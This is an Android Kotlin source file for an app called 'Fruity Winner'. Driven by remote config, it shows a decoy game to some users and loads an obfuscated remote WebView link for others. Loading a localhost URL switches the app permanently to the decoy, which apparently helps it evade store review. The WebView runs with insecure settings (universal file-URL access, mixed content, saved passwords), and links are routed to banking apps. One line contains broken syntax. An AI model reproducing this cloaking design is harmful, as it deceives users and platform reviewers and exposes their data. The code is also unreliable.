package com.fruity.fruitywinner

import android.Manifest
import android.app.Activity
import android.content.*
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.webkit.*
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.airbnb.lottie.LottieAnimationView
import com.airbnb.lottie.LottieDrawable
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.fruity.fruitywinner.databinding.ActivityMainBinding
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import com.google.android.gms.common.GooglePlayServicesRepairableException
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.onesignal.OneSignal
import kotlinx.coroutines.*
import java.io.IOException
import java.io.Serializable
import kotlin.coroutines.suspendCoroutine

class MainActivity : AppCompatActivity() {
    val secrets = Secrets()

    companion object {
        private const val REQUEST_CODE = 123
        var uploadMessage: ValueCallback<Array<Uri>>? = null
    }

    private var checkInet = false


    private lateinit var binding: ActivityMainBinding
    private val bundle = BuildConfig.APPLICATION_ID
    private lateinit var connectivityManager: ConnectivityManager
    private lateinit var networkChangeReceiver: NetworkChangeReceiver
    private val prefs: Prefs by lazy { Prefs(this) }
    private fun appsFlyerUID(): String = AppsFlyerLib.getInstance().getAppsFlyerUID(this) ?: "none"
    override fun onCreate(savedInstanceState: Bundle?) {
        checkInet = true
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        CoroutineScope(Dispatchers.IO).launch {
            initServer()
        }
        initAnimation()
        initConnect()
        initCheckForAddFiles()
        initCookies()
        initOtherSetting()
    }

    private fun initOtherSetting() {
        window.setFlags(
            WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE
        )
        binding.web.webViewClient = MyWebViewClient(this)
        binding.web.settings.apply {
            setSupportMultipleWindows(true)
            javaScriptCanOpenWindowsAutomatically = true
            javaScriptEnabled = true
            domStorageEnabled = true
            useWideViewPort = true
            setEnableSmoothTransition(true)
            cacheMode = WebSettings.LOAD_DEFAULT
            allowContentAccess = true
            saveFormData = true
            loadWithOverviewMode = true
            allowUniversalAccessFromFileURLs = true
            databaseEnabled = true
            allowFileAccess = true
            mixedContentMode = 0
            savePassword = true
            setSupportZoom(false)
            setRenderPriority(WebSettings.RenderPriority.HIGH)
            loadsImagesAutomatically = true
            allowFileAccessFromFileURLs = true
            userAgentString = userAgentString.replaceAfter(")", "")
        }
    }

    private fun initCookies() {
        CookieManager.getInstance().flush()
        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(binding.web, true)
    }

    private fun initCheckForAddFiles() {
        val activity: MainActivity = this
        binding.web.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                web: WebView?,
                filePathCallback: ValueCallback<Array<Uri>>?,
                fileChooserParams: FileChooserParams?,
            ): Boolean {
                if (ContextCompat.checkSelfPermission(
                        this@MainActivity,
                        Manifest.permission.READ_EXTERNAL_STORAGE
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    ActivityCompat.requestPermissions(
                        this@MainActivity,
                        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                        REQUEST_CODE
                    )
                }
                if (uploadMessage != null) {
                    uploadMessage!!.onReceiveValue(null)
                    uploadMessage = null
                }
                uploadMessage = filePathCallback
                val intent = fileChooserParams?.createIntent()
                try {
                    if (intent != null) {
                        startActivityForResult(intent, REQUEST_CODE)
                    }
                } catch (e: ActivityNotFoundException) {
                    uploadMessage = null
                    Toast.makeText(activity, "Cannot open file chooser", Toast.LENGTH_LONG).show()
                    return false
                }
                return true
            }

        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (resultCode == Activity.RESULT_OK && requestCode == REQUEST_CODE) {
            if (uploadMessage == null) return
            uploadMessage!!.onReceiveValue(
                WebChromeClient.FileChooserParams.parseResult(
                    resultCode,
                    data
                )
            )
            uploadMessage = null
        }
    }

    private fun initConnect() {
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        networkChangeReceiver = NetworkChangeReceiver()
    }

    private fun initAnimation() {
        val animationView: LottieAnimationView = findViewById(R.id.loading)
        animationView.setAnimation("loading.json")
        animationView.repeatCount = LottieDrawable.INFINITE
        animationView.playAnimation()
    }

    private suspend fun initServer() {
        supervisorScope {
            val fire = async(Dispatchers.IO) {
                getFirebase()
            }
            val advs = async(Dispatchers.IO) {
                getAdvs()
            }
            listOf(advs, fire).awaitAll()
            if (prefs.user) {
                val aps = async(Dispatchers.IO) {
                    getAF(prefs.advertiser, prefs.dom)
                }
                aps.await()
                if (prefs.finalLink != "") {
                    getWeb(prefs.finalLink)
                } else {
                    if (checkInet) {
                        getZagl()
                    }
                }
            } else {
                if (checkInet) {
                    getZagl()
                }
            }
        }
    }


    private fun getWeb(link: String) {
        getOneSignal()
        GlobalScope.launch(Dispatchers.Main) {
            binding.apply {
                loading.cancelAnimation()
                loading.visibility = View.GONE
                web.visibility = View.VISIBLE
                web.loadUrl(prefs.finalLink)
            }

        }
    }

    private fun getZagl() {
        GlobalScope.launch(Dispatchers.Main) {
            val intent = Intent(this@MainActivity, Menu::class.java)
            startActivity(intent)
            finish()
        }
    }

    private suspend fun getAdvs(): Serializable = supervisorScope {
        if (!prefs.isAdIdSaved) {
            //val advertisingId = getAdvertisingId(this@MainActivity)
            withContext(Dispatchers.IO) { getAdvertisingId(this@MainActivity) }
        } else {
            prefs.advertiser
        }

    }

    private suspend fun getFirebase(): Serializable = suspendCoroutine<Boolean> {
        if (prefs.checkLoc) {
            getZagl()
        } else {
            if (!prefs.user) {
                val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
                val configSettings = remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 3600
                }
                remoteConfig.setConfigSettingsAsync(configSettings)
                remoteConfig.setDefaultsAsync(R.xml.remote_config_defaults)
                remoteConfig.fetchAndActivate().addOnCompleteListener(this) { task ->
                    if (task.isSuccessful) {
                        val organicKey = remoteConfig.getString("password")
                        val result = remoteConfig.getBoolean("checking")
                        val resultPush = remoteConfig.getString("push")
                        val resultApps = remoteConfig.getString("apps")
                        val resultSite = remoteConfig.getString("site")

                        prefs.dom = resultSite
                        prefs.apps = resultApps
                        prefs.onesignal = resultPush
                        prefs.organic = organicKey
                        prefs.user = result

                        it.resumeWith(Result.success(result))
                    } else {
                        prefs.user = false
                        it.resumeWith(Result.success(false))
                    }
                }
            } else it.resumeWith(Result.success(prefs.user))
        }
    }


    override fun onStart() {
        super.onStart()
        registerReceiver(
            networkChangeReceiver, IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION)
        )
    }

    override fun onStop() {
        super.onStop()
        unregisterReceiver(networkChangeReceiver)
    }

    //call withot inet
    private fun onNetworkStateChanged(isConnected: Boolean) {
        GlobalScope.launch(Dispatchers.Main) {
            if (!isConnected) {
                checkInet = false
                val intent = Intent(this@MainActivity, MenuGame::class.java)
                startActivity(intent)
                finish()
            }
        }
    }

    // get change network
    inner class NetworkChangeReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val networkInfo = connectivityManager.activeNetworkInfo
            val isConnected = networkInfo != null && networkInfo.isConnected
            onNetworkStateChanged(isConnected)
        }
    }


    // AppsFlyer SDK and getID
    private suspend fun getAF(
        advertising: String,
        domain: String
    ): Serializable = suspendCoroutine<String> {
        if (prefs.finalLink != "") {
            it.resumeWith(Result.success(prefs.finalLink))
        } else {
            val cam = secrets.getKxtHdnAppsFlyerCampaign(packageName)
            val no = secrets.get AppsFlyerNone(packageName)
            val nu = secrets.getKxtHdnAppsFlyerNull(packageName)
            var isResumed = false
            val conversionListener = object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(conversionData: Map<String, Any>) {
                    if (!isResumed) {
                        isResumed = true
                        val campaign = conversionData[cam] as? String
                        if (campaign != null && campaign.lowercase() != no && campaign.lowercase() != nu) {
                            val key = campaign.split("_")
                            val alias = key[0]
                            val camp_group = key[1]
                            val sub_1 = key[2]
                            val sub_2 = key[3]
                            val sub_3 = key[4]

                            val cam = secrets.getKxtHdnLinkCampGroup(bundle)
                            val al = secrets.getKxtHdnLinkAlias(bundle)
                            val s = secrets.getKxtHdnLinkSubStyle(bundle)
                            val par = secrets.getKxtHdnLinkPartner(bundle)

                            val link =
                                "https://$domain/${prefs.organic}?$cam=$camp_group&$al=$alias&$par=$sub_1&${s}2=$sub_2&${s}3=$sub_3&${s}4=$advertising&${s}5=${appsFlyerUID()}&${s}7=$bundle"
                            prefs.finalLink = link
                            it.resumeWith(Result.success(link))

                        } else {
                            generateAndSaveOrganic()
                            it.resumeWith(Result.success(prefs.finalLink))
                        }
                    }
                }

                override fun onConversionDataFail(errorMessage: String?) {
                    if (!isResumed) {
                        isResumed = true
                        it.resumeWith(Result.success(""))
                    }
                }

                override fun onAppOpenAttribution(attributionData: Map<String, String>?) = Unit
                override fun onAttributionFailure(errorMessage: String?) {

                }

            }
            AppsFlyerLib.getInstance().init(prefs.apps, conversionListener, applicationContext)
            AppsFlyerLib.getInstance().start(this)
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isResumed && prefs.finalLink == "") {
                    isResumed = true
                    it.resumeWith(Result.success(""))

                }
            }, 10000)
        }

    }

    private fun generateAndSaveOrganic() {
        val cam = secrets.getKxtHdnLinkCampGroup(packageName)
        val s = secrets.getKxtHdnLinkSubStyle(packageName)
        val al = secrets.getKxtHdnLinkAlias(packageName)
        val non = secrets.getKxtHdnOrganicAlias(packageName)
        val org = secrets.getKxtHdnLinkOrganic(packageName)
        val link =
            "https://${prefs.dom}/${prefs.organic}?$cam=$org&$al=$non&${s}4=${prefs.advertiser}&${s}5=${appsFlyerUID()}&${s}7=$bundle"
        prefs.finalLink = link
    }

    private fun getOneSignal() {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.setAppId(prefs.onesignal)
        OneSignal.unsubscribeWhenNotificationsAreDisabled(true)
        OneSignal.initWithContext(this)
        OneSignal.promptForPushNotifications()
    }


    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (binding.web.canGoBack()) {
            binding.web.goBack()
        } else {
            super.onBackPressed()
        }
    }

    private class MyWebViewClient(private val mainActivity: MainActivity) : WebViewClient() {
        private val handler = Handler()
        private val prefs: Prefs by lazy { Prefs(mainActivity) }
        val secrets = Secrets()
        val packageName = "com.fruity.fruitywinner"
        val tel = secrets.getKxtHdnWebViewIntentTel(packageName)
        val tg = secrets.getKxtHdnWebViewIntentTg(packageName)
        val mail = secrets.getKxtHdnWebViewIntentMail(packageName)
        val local = secrets.getKxtHdnLocalhost(packageName)
        val uni = secrets.getKxtHdnWebViewIntentUni(packageName)
        val dia = secrets.getKxtHdnWebViewIntentDiia(packageName)
        val privat = secrets.getKxtHdnWebViewIntentPrivat(packageName)
        val vib = secrets.getKxtHdnWebViewIntentViber(packageName)
        val whatsA = secrets.getKxtHdnWebViewIntentWhatsA(packageName)
        val tgL = secrets.getKxtHdnWebViewIntentTgL(packageName)
        val diaL = secrets.getKxtHdnWebViewIntentDiiaL(packageName)
        val privatL = secrets.getKxtHdnWebViewIntentPrivatL(packageName)
        val vibL = secrets.getKxtHdnWebViewIntentViberL(packageName)
        val whatsAL = secrets.getKxtHdnWebViewIntentWhatsAL(packageName)
        val mailSub = secrets.getKxtHdnTextForEmailSubject(packageName)
        val mailBody = secrets.getKxtHdnTextForEmailSubject(packageName)
        val textDia = secrets.getKxtHdnToastForDia(packageName)
        val textPrivat = secrets.getKxtHdnToastForPrivat(packageName)

        override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
            val url = request.url.toString()
            if (url.startsWith(uni)) {
                view.loadUrl(Uri.encode(url))
                return true
            }
            if (url.startsWith(dia)) {
                try {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                        addCategory(Intent.CATEGORY_BROWSABLE)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        setPackage(diaL)
                    }
                    view.context?.startActivity(intent)
                } catch (e: ActivityNotFoundException) {
                    Toast.makeText(
                        view.context,
                        "$textDia",
                        Toast.LENGTH_LONG
                    ).show()
                }
                return true
            }
            if (url.startsWith(privat)) {
                try {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                        addCategory(Intent.CATEGORY_BROWSABLE)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        setPackage(privatL)
                    }
                    view.context?.startActivity(intent)
                } catch (e: ActivityNotFoundException) {
                    Toast.makeText(
                        view.context,
                        textPrivat,
                        Toast.LENGTH_LONG
                    ).show()
                }
                return true
            }
            if (url.startsWith(tg)) {
                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                    addCategory(Intent.CATEGORY_BROWSABLE)
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    setPackage(tgL)
                }
                view.context?.startActivity(intent)
                return true
            }
            if (url.startsWith(vib)) {

                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                    addCategory(Intent.CATEGORY_BROWSABLE)
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    setPackage(vibL)
                }
                view.context?.startActivity(intent)
                return true
            }
            if (url.startsWith(whatsA)) {

                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                    addCategory(Intent.CATEGORY_BROWSABLE)
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    setPackage(whatsAL)
                }
                view.context?.startActivity(intent)
                return true
            }
            if (url.startsWith(tel)) {
                val intent = Intent(Intent.ACTION_DIAL, Uri.parse(url))
                view.context?.startActivity(intent)
                return true
            }
            if (url.startsWith(mail)) {
                val intent = Intent(Intent.ACTION_SENDTO, Uri.parse(url))
                intent.putExtra(Intent.EXTRA_SUBJECT, mailSub)
                intent.putExtra(Intent.EXTRA_TEXT, mailBody)
                view.context?.startActivity(intent)
                return true
            }
            if (request.url.toString().contains(local)) {
                prefs.checkLoc = true
                mainActivity.getZagl()
            }
            prefs.lk = url
            handler.postDelayed({
                if (prefs.lk == url) {
                    if (!prefs.checkChecker) {
                        prefs.checkChecker = true
                        prefs.finalLink = url
                    }
                }
            }, 1000)
            view.loadUrl(url)
            return true
        }
    }

    private fun getAdvertisingId(context: Context): String {
        val advNull = secrets.getKxtHdnAdvsNull(packageName)
        return try {
            val advertisingInfo = AdvertisingIdClient.getAdvertisingIdInfo(context).id
                ?: advNull
            prefs.advertiser = advertisingInfo
            advertisingInfo
        } catch (e: IOException) {
            e.printStackTrace()
            ""
        } catch (e: GooglePlayServicesNotAvailableException) {
            e.printStackTrace()
            ""
        } catch (e: GooglePlayServicesRepairableException) {
            e.printStackTrace()
            ""
        }
    }
}